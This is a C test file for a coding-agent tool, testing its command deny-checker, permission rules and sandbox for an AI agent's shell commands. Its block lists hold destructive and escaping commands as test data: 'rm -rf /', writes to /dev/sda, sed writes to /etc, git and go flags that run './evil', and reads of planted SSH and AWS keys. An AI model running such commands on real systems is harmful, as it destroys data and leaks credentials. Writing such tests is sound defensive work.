    fake_tool(dir, "go", "exit 0");
    new_task(&m);
    run_agent(&m, "tool_calls", 5, bad, 1, &u);
    T("bash: non-zero exit status reported", has_msg(&m, "tool", "hi\n[exit status 3]"));
    T("bash: success has no status line", has_msg(&m, "tool", "fine") && !has_msg(&m, "tool", "[exit status 0]"));
    T("bash: timeout reported", has_msg(&m, "tool", "[timeout after 1s"));
    T("bash: signal death reported", has_msg(&m, "tool", "[killed by a signal]"));
    T("bash: output starting with error: keeps the signal",
      has_msg(&m, "tool", "error: boom\n[killed by a signal]"));
    msgs_free(&m);

    static const char *const wr[] = {"write_file", "{\"path\":\"a.go\",\"content\":\"x\"}"};
    static const struct { const char *body, *fin, *told; } cases[] = {
        {"echo broken; exit 1", "check-failed", "failed. Fix"},
        {"sleep 9", "check-timeout", "timed out"}};
    for (int i = 0; i < 2; i++) {
        fake_tool(dir, "go", cases[i].body);
        g_cfg.transcript = tr;
        unlink(tr);
        new_task(&m);
        agent_finish_reason = "tool_calls"; agent_calls = wr; agent_ncalls = 1; agent_tool_turns = 1;
        pid_t p = serve(reply_agent);
        const char *fin = agent_run(&m, &u, sum, sizeof sum);
        stop(p);
        g_cfg.transcript = NULL;
        T(cases[i].fin, !strcmp(fin, cases[i].fin) && strstr(sum, cases[i].fin));
        T("check outcome: model told", has_msg(&m, "user", cases[i].told));
        char *c = slurp(tr), want[64];
        snprintf(want, sizeof want, "\"run_finish\":\"%s\"", cases[i].fin);
        T("check outcome: in transcript", c && strstr(c, want));
        free(c);
        msgs_free(&m);
    }
    /* the gate fails once, then the user declines to run it again */
    fake_tool(dir, "go", "echo broken; exit 1");
    perm_free();
    Ui once = {.interactive = true, .approve_cmd = gate_once};
    once_asks = 0;
    new_task(&m);
    agent_finish_reason = "tool_calls"; agent_calls = wr; agent_ncalls = 1; agent_tool_turns = 1;
    pid_t op = serve(reply_agent);
    const char *ofin = agent_run(&m, &once, sum, sizeof sum);
    stop(op);
    T("check outcome: a declined re-run keeps the failure",
      once_asks == 2 && !strcmp(ofin, "check-failed") && strstr(sum, "check=skipped"));
    msgs_free(&m);

    bool failed_;
    char *o = gate_run(profile_detect(dir, "go"), dir, 1, &failed_);
    T("gate: timeout is not a pass", failed_);
    free(o);

    g_cfg.profile = prof;
    g_cfg.max_gates = gates; g_cfg.maxturns = turns; g_cfg.cmd_timeout = to;
    setenv("PATH", oldpath, 1);
    free(oldpath);
}

/* ---------- loop breaker: an edit is its text, not only its path ---------- */

static int loop_kind;   /* 0 new content, 1 new old/new strings, 2 identical write, 3 identical edit,
                           4 varying old_string that never matches */

static const char *reply_edits(int n) {
    if (n >= 4) return OK_HDR STOPPED "data: [DONE]\n\n";
    char args[1200], pad[801];
    memset(pad, 'x', 800);
    pad[800] = 0;
    int k = loop_kind < 2 ? n : 0;
    if (loop_kind == 4)
        snprintf(args, sizeof args, "{\"path\":\"f.txt\",\"old_string\":\"absent%d\",\"new_string\":\"y\"}", n);
    else if (loop_kind % 2 == 0)
        snprintf(args, sizeof args, "{\"path\":\"f.txt\",\"content\":\"%sv%d\"}", pad, k);
    else
        snprintf(args, sizeof args, "{\"path\":\"f.txt\",\"old_string\":\"v%d\",\"new_string\":\"v%d\"}", k, k + 1);
    const char *calls[] = {loop_kind % 2 == 0 && loop_kind != 4 ? "write_file" : "edit_file", args};
    return tool_reply("tool_calls", 1, calls);
}

static void test_loopedit(void) {
    char dir[] = "/tmp/fwloopXXXXXX", p[256], sum[256];
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    snprintf(p, sizeof p, "%s/f.txt", dir);
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
    char *prof = g_cfg.profile;
    g_cfg.profile = (char *)"generic";
    static const char *const names[] = {
        "successive rewrites of one file are kept", "successive edits of one file are kept",
        "identical writes are still a loop", "identical edits are still a loop",
        "failing edits with a varying old_string are a loop"};
    for (loop_kind = 0; loop_kind < 5; loop_kind++) {
        put(p, "v0\n");
        Ui u = {.interactive = true};
        Msgs m;
        new_task(&m);
        pid_t srv = serve(reply_edits);
        agent_run(&m, &u, sum, sizeof sum);
        stop(srv);
        T(names[loop_kind], (strstr(sum, "prunes=0 ") != NULL) == (loop_kind < 2));
        msgs_free(&m);
    }
    g_cfg.profile = prof;
}

#ifdef FW_MINI_HTTP
int fw_mini_post_stream(const char *url, const char *payload, int streaming,
                        size_t (*cb)(char *, size_t, size_t, void *), void *ud,
                        int timeout_s, int *status, char *errbuf, size_t errcap);
static void test_connect_timeout(void) {
    char err[128] = "";
    int status = 0;
    time_t t0 = time(NULL);
    /* private address nothing answers on (or no route: fails at once) */
    int rc = fw_mini_post_stream("http://10.255.255.1:9/v1", "{}", 0, NULL, NULL, 1, &status, err, sizeof err);
    T("connect honours its timeout", rc != 0 && time(NULL) - t0 <= 4);
}
#endif

static void test_cli_values(void) {
    static const char *const flags[] = {"-e", "-m", "-P", "-f", "-T", "-W", "--sys", "--transcript", "-C", NULL};
    for (int i = 0; flags[i]; i++) {
        char *av[] = {"flywheel", (char *)flags[i], NULL};
        run_flywheel(false, av);
        T(flags[i], run_status == 2);
    }
    char *av[] = {"flywheel", "-f", "/nonexistent/prompt.md", NULL};
    run_flywheel(false, av);
    T("unreadable prompt file is an error", run_status == 2);

    bad_reply = OK_HDR STOPPED "data: [DONE]\n\n";
    pid_t srv = serve(reply_fixed);
    char *q[] = {"flywheel", "-C", "/tmp", "-P", "generic", "-e", g_cfg.endpoint,
                 "describe the codebase layout",
                 sandbox_available() ? NULL : "--unsafe", NULL};
    char *o = run_flywheel(false, q);
    T("one-shot question finishes in one turn", strstr(o, "finish=done turns=1 ") != NULL);
    stop(srv);
}

/* ---------- second review round ---------- */

static void test_review2_deny(void) {
    const char *cwd = "/tmp/sb";
    static const char *no[] = {
        "ln -st /usr/local/bin a b", "ln -sfvt /etc a b", "ln -t/etc a", "ln -st/etc a",
        "install -t/etc a", "install -vt /etc a", "ln --target-directory /etc a",
        "ln --target-directory=/etc a", "install --target-directory /etc a", "cp -rt /etc a",
        "cp -t/etc a", "mv -ft /etc a", "cp --target-directory /etc a", "mv --target-directory /etc a",
        "rsync -a ./ /etc/ --exclude .git", "rsync -a src/ /etc/ --include x --exclude-from f",
        "rsync -a src/ /etc/ --filter '- x' --rsh ssh", "rsync -a src/ /etc/ -e ssh",
        "find -O3 /etc -delete", "find -D tree /etc -delete", "find -f /etc -delete", "find -- /etc -delete",
        "find /etc -exec cp x {} \\;", "find /etc -exec cp -t {} x \\;", "find -files0-from list -delete",
        "sed -n 'w /etc/x' f", "sed 's/a/b/w /etc/x' f", "sed -e p -e 'W /etc/x' f",
        "sed '/q/{s|a|b|gw /etc/x\n}' f", "sed --expression='1w /etc/x' f", "sed 's/a/b/e' f",
        "sed -I '' s/a/b/ /etc/x",
        "rsync -a --log-file /etc/x a b", "rsync -a --log-file=/etc/x a b", "rsync -a --backup-dir /etc a b",
        "rsync -a --temp-dir=/etc a b", "rsync -a -T /etc a b", "rsync -a --write-batch /etc/x a b",
        "rsync --no-such-option a b", "cp --target-dir=/etc a", "touch --frob a", "sed --frob p f",
        "flywheel --allow-outside-writes 'x'", "./flywheel -q --allow-outside-writes x", NULL};
    for (int i = 0; no[i]; i++) T(no[i], deny_check(no[i], cwd) != NULL);
    static const char *yes[] = {
        "ln -st build a b", "cp -rt build a b", "rsync -a ./ /tmp/out/ --exclude .git",
        "rsync -a --exclude node_modules --delete src/ dist/", "rsync -a src/ build/ --log-file rsync.log",
        "find /usr/share -name x -exec cp {} ./out/ ;", "find /usr/share -name x -exec cp -t out {} +",
        "find -O3 . -name '*.tmp' -delete", "find -- build -delete", "sed -n 's/a/b/w out.txt' f",
        "sed 's/w \\/etc/x/g' f", "sed '/w /d' f", "sed 's/[/]w/x/' f", "sed -n '1,5p;/x/{p;q}' /etc/hosts",
        "sed 'a w /etc/x' f", "touch --date=now a", "mkdir --parents out", "rm --recursive --force build",
        "chmod --reference=/etc/hosts a", "cp --preserve=mode a b", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], deny_check(yes[i], cwd) == NULL);
}

static void test_review2_optout(void) {
    const char *cwd = "/tmp/sb";
    static const char *outside[] = {"echo x > /etc/motd", "cp a /usr/local/bin/b", "mkdir -p /opt/app",
        "rm -rf /opt/app", "sed -i s/a/b/ /etc/hosts", "find /etc -delete", "ln -st /usr/local/bin a b",
        "rsync --no-such-option a /srv/", "sed -n 'w /etc/x' f", "tee /etc/x", NULL};
    static const char *still[] = {"rm -rf /", "rm -rf ~", "rm -rf /*", "rm -fr /", "rm -r -f \"/\"",
        "rm -rf $HOME", "rm -rf ${HOME}/", "rm -rf ~/*", "cd /tmp && rm -fr ../..", "sudo ls",
        "mkfs.ext4 /dev/x", "echo x > /dev/sda", "flywheel --allow-outside-writes x", NULL};
    for (int i = 0; outside[i]; i++) T(outside[i], deny_check(outside[i], cwd) != NULL);
    g_cfg.outside_writes = true;
    for (int i = 0; outside[i]; i++) T(outside[i], deny_check(outside[i], cwd) == NULL);
    for (int i = 0; still[i]; i++) T(still[i], deny_check(still[i], cwd) != NULL);
    g_cfg.outside_writes = false;
    char *argv[] = {"flywheel", "--allow-outside-writes", "-h", NULL};
    char *out = run_flywheel(false, argv);
    T("flag is accepted", run_status == 0 && strstr(out, "--allow-outside-writes"));
}

static void test_review2_perm(void) {
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(projdir);
    perm_free();
    static const char *no[] = {
        "grep -R x .", "grep -rnR x .", "grep -S -r x .", "grep --dereference-recursive x .",
        "rg -L x", "rg --follow x", "find -L . -name x", "find . -follow", "fd -L x", "fd --follow x",
        "ls -L", "ls -lRL .", "grep -e x /etc/passwd", "grep /etc/passwd -e x",
        "rg --ignore-file /etc/passwd x", "grep -A 3 x /etc/passwd", "cut -d / -f1 /etc/passwd", NULL};
    for (int i = 0; no[i]; i++) T(no[i], !perm_allowed(no[i]));
    static const char *yes[] = {
        "grep -r \"/api/users\" src", "grep -rn \"//TODO\" .", "grep -n '/\\*' a.c", "cut -d / -f1 a",
        "rg /api src", "grep -A 3 /api src", "sort -t / a", "grep -r x .", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], perm_allowed(yes[i]));
    perm_add_rule("perl");
    T("perl -e never auto-allowed", !perm_allowed("perl -e 'unlink 1'") && !perm_allowed("perl -ne print a") &&
      !perm_allowed("perl -E say"));
    static const char *none[] = {
        "make", "make build", "pip install x", "uv run x", "docker run x", "kubectl exec x", "sqlite3 db",
        "vim x", "tar -xf a", "sed s/a/b/ f", "curl x", "./run.sh", "python3 manage.py test", "node app.js",
        "git push", "git config a b", "npm run", "npm publish", "go run .", "cargo run", "npx cowsay", NULL};
    for (int i = 0; none[i]; i++) { char *p = perm_prefix(none[i]); T(none[i], p && !*p); free(p); }
    static const char *some[][2] = {{"git status -s", "git status"}, {"npm test", "npm test"},
        {"npm run build -- x", "npm run build"}, {"cargo test --all", "cargo test"},
        {"go vet ./...", "go vet"}, {"uname -a", "uname"}};
    for (int i = 0; i < 6; i++) {
        char *p = perm_prefix(some[i][0]);
        T(some[i][0], p && !strcmp(p, some[i][1]));
        free(p);
    }
    char pf[1200];
    if (perm_project_file(pf, sizeof pf)) unlink(pf);
    perm_free();
}

/* ---------- scan-last findings ---------- */

static void test_scan_deny(void) {
    const char *cwd = "/tmp/sb";
    static const char *no[] = {
        "sed '$w /etc/x' f", "sed -n '$!{w /etc/x\n}' f", "sed '$s/a/b/w /etc/x' f",
        "sed -n '${w /etc/x\n}' f", "sed -e '$W /etc/x' f",
        "sed '$wab/../../../etc/x' f",
        "sed \"$SCRIPT\" f", "sed $SCRIPT f", "sed -n \"${SCRIPT}\" f", "sed -e\"$SCRIPT\" f",
        "sed --expression=\"$SCRIPT\" f", "sed -e p -e \"p;$more\" f", "sed \"$(cat s)\" f", "sed $(cat s) f",
        "find . -exec sed \"$S\" {} \\;",
        "sed -f s.sed f", "sed -fs.sed f", "sed -nf s.sed f", "sed --file s.sed f", "sed --file=s.sed f",
        "env -u FOO rm /etc/x", "env -C sub rm /etc/x", "env -iu FOO rm /etc/x",
        "xargs -I {} rm /etc/x", "xargs -n one rm /etc/x", "xargs -P max rm /etc/x", "xargs -L x rm /etc/x",
        "xargs -d , rm /etc/x", "timeout -s KILL 5 rm /etc/x", "timeout -k soon 5 rm /etc/x", NULL};
    for (int i = 0; no[i]; i++) T(no[i], deny_check(no[i], cwd) != NULL);
    static const char *yes[] = {
        "sed -n '$p' f", "sed '$d' f", "sed -n '${p;q}' f", "sed -n '$!{p}' f", "sed -n \"\\$p\" f",
        "sed -n \"1,$ p\" f", "sed '$a tail' f", "env -u FOO rm build/x", "xargs -I {} rm build/{}",
        "xargs -n1 rm build/x", "timeout -s KILL 5 rm build/x", "timeout -sKILL 5 rm build/x", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], deny_check(yes[i], cwd) == NULL);
    g_cfg.outside_writes = true;
    T("sed -f with outside writes", !deny_check("sed -f s.sed f", cwd));
    T("sed $VAR with outside writes", !deny_check("sed \"$SCRIPT\" f", cwd));
    g_cfg.outside_writes = false;
}

static void test_scan_find_list(void) {
    const char *cwd = "/tmp/sb";
    static const char *no[] = {
        "find -files0-from list -delete", "find -files0-from list -exec cp {} /tmp/sb/ \\;",
        "find -files0-from list -exec rm {} \\;", "find -files0-from list -execdir rm {} +",
        "find -files0-from list -exec ./script.sh {} \\;", "find -files0-from list -ok mv {} out \\;",
        "find -files0-from=list -okdir touch {} \\;", "find -exec chmod 600 {} + -files0-from list", NULL};
    for (int i = 0; no[i]; i++) T(no[i], deny_check(no[i], cwd) != NULL);
    static const char *yes[] = {"find -files0-from list", "find -files0-from list -print",
        "find -files0-from list -exec grep -l x {} +", "find -files0-from list -execdir cat {} \\;", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], deny_check(yes[i], cwd) == NULL);
    g_cfg.outside_writes = true;
    for (int i = 0; no[i]; i++) T(no[i], deny_check(no[i], cwd) == NULL);
    g_cfg.outside_writes = false;
}

static void test_scan_perm(void) {
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(projdir);
    perm_free();
    perm_add_rule("git fetch");
    perm_add_rule("go test");
    perm_add_rule("go build");
    perm_add_rule("go vet");
    static const char *no[] = {
        "git fetch --upload-pack=./evil .", "git fetch --upload-pack ./evil .", "git fetch --upl=./evil .",
        "git fetch --upload-pa ./evil .",
        "go test -exec ./evil.sh ./...", "go test --exec=./evil.sh ./...",
        "go build -toolexec ./evil.sh", "go build --toolexec=./evil.sh",
        "go build -o /etc/x .", "go build --o=/etc/x .",
        "go vet -vettool=x", "go vet --vettool x", NULL};
    for (int i = 0; no[i]; i++) T(no[i], !perm_allowed(no[i]));
    static const char *yes[] = {"git fetch origin", "go test -run X ./...", "go build ./...", "go vet ./...", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], perm_allowed(yes[i]));
    char pf[1200];
    if (perm_project_file(pf, sizeof pf)) unlink(pf);
    perm_free();
}

static void test_scan_expansion(void) {
    const char *cwd = "/tmp/sb";
    static const char *no[] = {
        "sed \"s/a/$X/\" f", "sed s/a/$X/ f", "sed \"s/$X/b/\" f", "sed -e \"y/ab/$X/\" f",
        "sed --expression=\"s/a/${X}/\" f", "sed \"s/a/$(cat s)/\" f", "sed s/a/$(cat s)/ f",
        "sed \"s/a/`cat s`/\" f", "sed s/a/`cat s`/ f", "sed `cat s` f", "sed -e `cat s` f",
        "sed \"s/a/$[1]/\" f", "sed s/a/{b,c}/ f", "sed s/a*/b/ f", "sed -n$X p f",
        "find . -exec sed \"s/a/$X/\" {} \\;", "xargs sed \"s/a/$X/\"",
        "env --unset FOO rm /etc/x", "env --chdir sub rm /etc/x", "env --chdir=/etc rm x",
        "env -C /etc rm x", "env -C/etc touch x", "env -C \"$D\" rm x",
        "env --split-string 'rm /etc/x'", "env -S 'rm /etc/x'", "env --frob rm x", "env -Z rm x",
        "timeout --signal KILL 5 rm /etc/x", "timeout --kill-after 3 5 rm /etc/x", "timeout .5 rm /etc/x",
        "timeout --frob 5 rm x", "xargs --arg-file list rm /etc/x", "xargs -a list rm /etc/x",
        "xargs -E end rm /etc/x", "xargs -s 100 rm /etc/x", "xargs --max-args 1 rm /etc/x",
        "xargs --frob rm x", "nice --adjustment 5 rm /etc/x", "nice -n -5 rm /etc/x", "exec -a name rm /etc/x",
        "time -p rm /etc/x", "nohup -- rm /etc/x", "setsid --frob rm x", NULL};
    for (int i = 0; no[i]; i++) T(no[i], deny_check(no[i], cwd) != NULL);
    static const char *yes[] = {
        "sed 's/a$//' f", "sed \"s/a$//\" f", "sed s/a$// f", "sed 's/$X/`y`/' f", "sed 's/a*/{b,c}/' f",
        "echo `sed -n p f`", "x=`sed -n 1p f`", "rm build/`date`", "sed -n /x/{p\\;q} f",
        "env --unset=FOO rm build/x", "env --unset FOO rm build/x", "env -i A=1 rm build/x", "env - rm build/x",
        "env -C sub rm x", "env --chdir=sub rm x", "timeout --signal=KILL --kill-after 3 5 rm build/x",
        "timeout --preserve-status .5 rm build/x", "xargs -a list rm build/x", "xargs -0 -r rm build/x",
        "xargs --arg-file=list -E end -s 100 rm build/x", "nice -n 5 rm build/x", "nice -5 rm build/x",
        "command -v rm", "time -p make", "nohup -- rm build/x", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], deny_check(yes[i], cwd) == NULL);
}

static void test_scan_git_remote(void) {
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(projdir);
    perm_free();
    perm_add_rule("git push");
    perm_add_rule("git ls-remote");
    static const char *no[] = {
        "git push --receive-pack=./evil origin", "git push --receive-pack ./evil origin",
        "git push --rece=./evil origin", "git push --exec=./evil origin", "git push --exec ./evil origin",
        "git ls-remote --exec=./evil .", "git ls-remote --upload-pack=./evil .", NULL};
    for (int i = 0; no[i]; i++) T(no[i], !perm_allowed(no[i]));
    static const char *yes[] = {"git push origin main", "git push --recurse-submodules=no origin",
        "git ls-remote origin", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], perm_allowed(yes[i]));
    char pf[1200];
    if (perm_project_file(pf, sizeof pf)) unlink(pf);
    perm_free();
}

static void test_review3(void) {
    const char *cwd = "/tmp/sb";
    static const char *no[] = {
        "sed -e p $(true) -e 'w /etc/x' f", "sed -e p `true` -e 'w /etc/x' f",
        "sed -e p {-e,'w /etc/x'} f", "sed -e p $F -e p f", "sed -n p $F -f s.sed", "sed -e p {a,-e} 'w /etc/x'",
        "rm $(true) /etc/x", "rm `true` /etc/x", "rm $(echo $(true)) /etc/x", "touch a $(true; true) /etc/x",
        "echo $(case a in a) rm /etc/x;; esac)", NULL};
    for (int i = 0; no[i]; i++) T(no[i], deny_check(no[i], cwd) != NULL);
    static const char *yes[] = {
        "sed -e p -e q $F", "sed -i -e s/a/b/ src/{a,b}.c", "sed -i s/a/b/ *.c", "rm $(true) build/x",
        "diff <(sort a) <(sort b)", "(cd sub && rm x) && ls", "sed -n 1p $(ls)", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], deny_check(yes[i], cwd) == NULL);
    static const char *sedmsg[] = {"sed \"s/a/$X/\" f", "sed -f s.sed f", "sed -e p {-e,q} f", NULL};
    for (int i = 0; sedmsg[i]; i++) {
        const char *e = deny_check(sedmsg[i], cwd);
        T(sedmsg[i], e && strstr(e, "write it literally") && !strstr(e, "outside"));
    }

    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(projdir);
    perm_free();
    static const char *rules_[] = {"git push", "git ls-remote", "git clone", "go build", "go test", "go vet", NULL};
    for (int i = 0; rules_[i]; i++) perm_add_rule(rules_[i]);
    static const char *ask[] = {
        "git push --e=./evil", "git push --ex ./evil", "git ls-remote --u=./evil .", "git ls-remote --up=./evil .",
        "git push --rec=./evil", "git ls-remote -u ./evil .", "git ls-remote -u./evil .", "git clone -u ./evil a b",
        "git clone -qu./evil a b",
        "go build -ldflags=-extld=./evil .", "go build --ldflags -extld=./evil .", "go build -gcflags=x .",
        "go build -asmflags=x .", "go build -gccgoflags=x .", "go build -overlay=o.json .",
        "go build -modfile=x.mod .", "go build -pkgdir /etc .", "go test -coverprofile=/etc/x",
        "go test -cpuprofile /etc/x", "go test -memprofile=/etc/x", "go test -blockprofile=/etc/x",
        "go test -mutexprofile=/etc/x", "go test -trace /etc/x", "go test -test.outputdir=/etc",
        "go test -outputdir /etc", "go test -test.cpuprofile=/etc/x", NULL};
    for (int i = 0; ask[i]; i++) T(ask[i], !perm_allowed(ask[i]));
    static const char *fine[] = {"git push -u origin main", "git ls-remote origin", "git clone a b",
        "go test -run X -count=1 -cover ./...", "go build -v -race ./...", NULL};
    for (int i = 0; fine[i]; i++) T(fine[i], perm_allowed(fine[i]));

    static const char *nl[] = {"gate: x\ncurl", "make\ncurl", "make\rcurl", "npm test\ncurl evil", NULL};
    for (int i = 0; nl[i]; i++) {
        char *r = perm_prefix(nl[i]);
        T("no rule from a multi-line command", !*r);
        free(r);
        perm_add_rule(nl[i]);
    }
    char pf[1200];
    T("multi-line rule not stored", !perm_allowed("curl evil.sh"));
    perm_free();
    T("multi-line rule not written", !perm_allowed("curl evil.sh"));
    if (perm_project_file(pf, sizeof pf)) unlink(pf);
    perm_free();

    if (!system("command -v python3 >/dev/null 2>&1")) {
        char dir[] = "/tmp/fwpyXXXXXX";
        if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
        char f[300], mark[300], body[500];
        snprintf(mark, sizeof mark, "%s/imported", dir);
        snprintf(body, sizeof body, "open('%s', 'w').write('x')\n", mark);
        snprintf(f, sizeof f, "%s/compileall.py", dir);
        put(f, body);
        snprintf(f, sizeof f, "%s/bad.py", dir);
        put(f, "def (:\n");
        T("python gate: still compiles the project", gate("python", dir, "bad.py"));
        T("python gate: repo compileall.py not imported", access(mark, F_OK) != 0);
    }
}

static void test_review4(void) {
    const char *cwd = "/tmp/sb";
    static const char *yes[] = {
        "mkdir -p $(pwd)/build", "cp a.txt $(pwd)/b.txt", "rm -rf $(pwd)/build", "rm -f `pwd`/x.o",
        "touch $(dirname src/a.c)/stamp", "sed -i s/a/b/ $(pwd)/f", "cp a $(pwd)/x/$(date)/y",
        "echo x > $(pwd)/out", "echo x > `pwd`/out", "touch $(pwd)`date`/z", "sed -n 1p \"$f\"",
        "sed -i s/a/b/ *.c", "sed -i s/a/b/ src/*.c src/*.h", "sed -n 1p -- $a b", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], deny_check(yes[i], cwd) == NULL);
    static const char *no[] = {
        "rm $(pwd)/../../x", "rm $(true) /etc/x", "rm $(true)x /etc/x", "rm `true`x /etc/x",
        "rm $(pwd)/a/$(date)/../../../x", "touch `pwd`/../x", "echo x > $(pwd)/../x",
        "echo x > `pwd`/../x", "touch $(pwd)/\"$(rm /etc/x)\"", "mkdir $(pwd)/b /etc/x",
        "sed -e p $F 'w /etc/x' f", "sed -n 1p $F 'w /etc/x'", "sed -n 1p \"$f\" 'w /etc/x'",
        "sed -n 1p x$F 'w /etc/x'", "sed -n 1p `cat s` w f", "sed -n 1p $(cat s) 'w /etc/x'",
        "sed -n 1p *x 'w /etc/x'", "sed -e p $F -- 'w /etc/x'", NULL};
    for (int i = 0; no[i]; i++) T(no[i], deny_check(no[i], cwd) != NULL);
    g_cfg.outside_writes = true;
    T("sed operand rule off with outside writes", !deny_check("sed -n 1p $F x", cwd));
    g_cfg.outside_writes = false;

    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(projdir);
    perm_free();
    static const char *rules_[] = {"git", "go", NULL};
    for (int i = 0; rules_[i]; i++) perm_add_rule(rules_[i]);
    static const char *ask[] = {
        "git clone -c core.fsmonitor=./evil a b", "git clone -ccore.x=./evil a b", "git clone --config x=y a b",
        "git clone --conf=x=y a b", "git clone --template=./t a b", "git clone --templ ./t a b",
        "git clone -qc x=y a b", "git clone --recurse-submodules a b", "git ls-remote -c x=y .",
        "git ls-remote --config=x=y .", "git -c core.x=./evil ls-remote .", "git -c core.x=./evil clone a b",
        "git ls-remote --frob .",
        "git --git-dir . ls-remote -u ./evil .", "git --work-tree . ls-remote -u ./evil .",
        "git --namespace x clone -u ./evil a b",
        "go build -C /etc", "go -C /etc build", "go build -debug-actiongraph=/etc/x",
        "go build -debug-trace=/etc/x", "go build -debug-runtime-trace /etc/x",
        "go test -test.testlogfile=/etc/x", "go test -test.gocoverdir=/etc", "go test -test.fuzzcachedir=/etc",
        "go test --testlogfile /etc/x", "go test -args -x", "go build -frob", "go env -w X=y", NULL};
    for (int i = 0; ask[i]; i++) T(ask[i], !perm_allowed(ask[i]));
    static const char *fine[] = {
        "git clone -q --depth 1 -b main a b", "git clone --depth=1 --single-branch --no-tags a b",
        "git ls-remote --heads --tags origin", "git ls-remote -q --exit-code origin main",
        "git log --grep clone", "git status --short",
        "go test -v -race -run X -count=1 -short -timeout 30s ./...",
        "go test -tags=x -bench . -benchmem -failfast -json -cover -covermode=atomic -parallel 4 ./...",
        "go test -test.v -test.run=X", "go vet -atomic ./...", NULL};
    for (int i = 0; fine[i]; i++) T(fine[i], perm_allowed(fine[i]));
    char pf[1200];
    if (perm_project_file(pf, sizeof pf)) unlink(pf);
    perm_free();
}

/* ---------- sandbox ---------- */

static bool out_has(const char *cmd, const char *frag) {
    char *o = run_bash(cmd, g_cfg.cwd, 10);
    bool hit = strstr(o, frag) != NULL;
    free(o);
    return hit;
}

static int sbx_asks;
static bool sbx_answer;
static char sbx_asked[600];
static bool sbx_ask(const char *cmd, bool gate, void *ud) {
    (void)gate; (void)ud;
    sbx_asks++;
    snprintf(sbx_asked, sizeof sbx_asked, "%s", cmd);
    return sbx_answer;
}

/* one bash tool call through the agent loop; true if a message contains frag */
static bool agent_bash(const char *args, Ui *ui, const char *frag) {
    const char *calls[] = {"bash", args};
    Msgs m;
    new_task(&m);
    sbx_asks = 0;
    sbx_asked[0] = 0;
    run_agent(&m, "tool_calls", 1, calls, 1, ui);
    bool hit = any_msg(&m, frag);
    msgs_free(&m);
    return hit;
}

/* a listening socket on loopback: connecting succeeds iff network is allowed */
static int listener(int *port) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {.sin_family = AF_INET};
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    socklen_t al = sizeof a;
    if (bind(s, (struct sockaddr *)&a, sizeof a) || listen(s, 8) ||
        getsockname(s, (struct sockaddr *)&a, &al)) return -1;
    *port = ntohs(a.sin_port);
    return s;
}

static void test_sandbox(void) {
    char base[] = "/tmp/fwboxXXXXXX", proj[600], home[600], p[900], cmd[1500];
    if (!mkdtemp(base)) { T("mkdtemp", false); return; }
    /* the quote and backslash must survive into the profile */
    snprintf(proj, sizeof proj, "%s/pro\"j\\", base);
    snprintf(home, sizeof home, "%s/home", base);
    mkdir(proj, 0700);
    mkdir(home, 0700);
    static const char *const dirs[] = {".ssh", ".aws", ".config", ".config/gh", ".config/flywheel"};
    for (int i = 0; i < 5; i++) {
        snprintf(p, sizeof p, "%s/%s", home, dirs[i]);
        mkdir(p, 0700);
        if (i == 2) continue;
        snprintf(p, sizeof p, "%s/%s/key", home, dirs[i]);
        put(p, "TOPSECRET");
    }
    snprintf(p, sizeof p, "%s/plain", home);
    put(p, "readable");
    char *oldhome = str_dup(getenv("HOME"));
    setenv("HOME", home, 1);
    setenv("FW_TEST_TOKEN", "tok-leak-123", 1);
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(proj);

    snprintf(p, sizeof p, "%s/listed-file", proj);
    put(p, "x");

    /* ordinary work */
    T("project write works", out_has("echo hi-in-project > f && cat f", "hi-in-project"));
    T("private TMPDIR is writable",
      out_has("echo tmp-ok > \"$TMPDIR/x\" && cat \"$TMPDIR/x\"; rm \"$TMPDIR/x\"", "tmp-ok"));
    T("/dev/null and /dev/stderr", out_has("echo a >/dev/null && echo dev-ok >/dev/stderr", "dev-ok"));
    T("heredoc and process substitution", out_has("cat <(cat <<E\nsub-ok\nE\n)", "sub-ok"));

    /* writes outside */
    snprintf(cmd, sizeof cmd, "echo x > '%s/escaped'", base);
    int code = 0;
    free(run_bash_status(cmd, g_cfg.cwd, 10, &code));
    snprintf(p, sizeof p, "%s/escaped", base);
    T("outside write blocked", code > 0 && access(p, F_OK));
    T("outside write via interpreter blocked", out_has("python3 -c 'open(\"../escaped\",\"w\")'; true", "Error"));
    T("outside write via interpreter left nothing", access(p, F_OK) != 0);
    T("home write blocked", out_has("echo x > \"$HOME/escaped\"", "Operation not permitted"));

    /* secret reads */
    static const char *const reads[] = {"cat ../home/.ssh/key", "cat \"$HOME/.aws/key\"",
        "cat ../home/.config/gh/key", "cat ../home/.config/flywheel/key", "cat ../HOME/.SSH/key",
        "ln -s ../home/.ssh/key sl; cat sl", "ln ../home/.ssh/key hl; cat hl", "cp -R ../home/.ssh copy; cat copy/key"};
    for (int i = 0; i < (int)(sizeof reads / sizeof *reads); i++) {
        char *o = run_bash(reads[i], g_cfg.cwd, 10);
        T(reads[i], !strstr(o, "TOPSECRET"));
        free(o);
    }
    T("other home files are unreadable", !out_has("cat ../home/plain", "readable"));

    /* a project that contains the home directory still cannot touch the stores */
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(base);
    T("secret inside project unreadable", !out_has("cat home/.ssh/key", "TOPSECRET"));
    free(run_bash("echo CHANGED > home/.ssh/key", g_cfg.cwd, 10));
    snprintf(p, sizeof p, "%s/.ssh/key", home);
    T("secret inside project unwritable", holds(p, "TOPSECRET"));
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(proj);

    /* environment */
    char *env = run_bash("env", g_cfg.cwd, 10);
    T("token not inherited", !strstr(env, "tok-leak-123") && !strstr(env, "FW_TEST_TOKEN"));
